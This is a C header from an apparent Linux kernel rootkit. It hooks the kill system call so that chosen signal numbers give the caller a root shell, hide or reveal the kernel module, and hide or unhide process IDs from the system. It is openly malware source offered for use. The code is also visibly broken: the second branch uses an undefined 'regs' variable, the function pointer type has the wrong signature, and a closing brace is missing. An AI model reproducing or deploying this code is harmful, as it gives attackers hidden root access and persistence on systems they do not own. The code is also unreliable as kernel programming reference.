#include <linux/types.h>

#include "syscall_table_fetch.h"
#include "rootkit_utils.h"
#include "hide_show_helper.h"
#include "cred_helper.h"

#ifndef SYSCALL_KILL_HOOK_H
#define SYSCALL_KILL_HOOK_H


#ifdef PTREGS_SYSCALL_STUBS
static tt_syscall original_kill;
#else
typedef asmlinkage long (*tt_syscall_kill)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
static tt_syscall_kill original_kill;
#endif

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage int kill_hook(const struct pt_regs * regs) {
    int signal = (int) regs->si;

    if (signal == ROOT_SHELL_SIGNAL_CODE) {
        get_root();
        return 0;
    } else if (signal == TOGGLE_MODULE_HIDE_SIGNAL_CODE) {
        if (hidden == 0) {
            hideme();
        } else {
            showme();
        }
        return 0;
    } else if (signal == TOGGLE_PID_HIDE_SIGNAL_CODE) {
        char * strpid;
        struct linked_list_node *node;
        struct linked_list_node *target = NULL;

        strpid = (char *) kzalloc(20, GFP_KERNEL);
        if ((strpid == NULL)) {
            return 0;
        }
        snprintf(strpid, 20, "%d", (int) regs->di);
        list_for_each_entry(node, &excluded_pids, list) {
            if (memcmp(node->data, strpid, strlen(strpid)) == 0) {
                target = node;
                break;
            }
        }
        if (target) {
            list_del(&target->list);
            kfree(target->data);
            kfree(target);
            kfree(strpid);
        } else {
	        append_node(&excluded_pids, strpid);
        }
        return 0;
    }
    return original_kill(regs);
}
#else
static asmlinkage int kill_hook(pid_t pid, int sig) {
    if (sig == ROOT_SHELL_SIGNAL_CODE) {
        get_root();
        return 0;
    } else if (sig == TOGGLE_MODULE_HIDE_SIGNAL_CODE) {
        if (hidden == 0) {
            hideme();
        } else {
            showme();
        }
        return 0;
    } else if (sig == TOGGLE_PID_HIDE_SIGNAL_CODE) {
        char * strpid;
        struct linked_list_node *node;
        struct linked_list_node *target = NULL;

        strpid = (char *) kzalloc(20, GFP_KERNEL);
        if ((strpid == NULL)) {
            return 0;
        }
        snprintf(strpid, 20, "%d", (int) regs->di);
        list_for_each_entry(node, &excluded_pids, list) {
            if (memcmp(node->data, strpid, strlen(strpid)) == 0) {
                target = node;
                break;
            }
        }
        if (target) {
            list_del(&target->list);
            kfree(target->data);
            kfree(target);
            kfree(strpid);
        } else {
	        append_node(&excluded_pids, strpid);
        }
        return 0;
    }
    return original_kill(pid, sig);
#endif

#endif